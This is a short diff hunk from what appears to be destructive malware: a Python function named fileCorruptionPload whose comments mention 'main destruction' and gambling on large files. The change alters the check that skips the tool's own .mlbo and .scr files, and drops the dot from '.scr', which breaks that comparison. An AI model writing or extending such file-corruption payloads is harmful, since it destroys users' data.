@@ -133,7 +133,7 @@ def fileCorruptionPload(useAdmin, dbg, cAmount, thr=0, renameOnly=False):
                     randChoice = rand.choice(dirList)
             
             # main destruction
-            if (os.path.splitext(direc)[1] == '.mlbo') or (os.path.splitext(direc)[1] == '.scr'):
+            if (os.path.splitext(direc)[1] == '.mlbo') or (os.path.splitext(direc)[1] == 'scr'):
                 print('skip file')
             
             # plays random chance game with large files
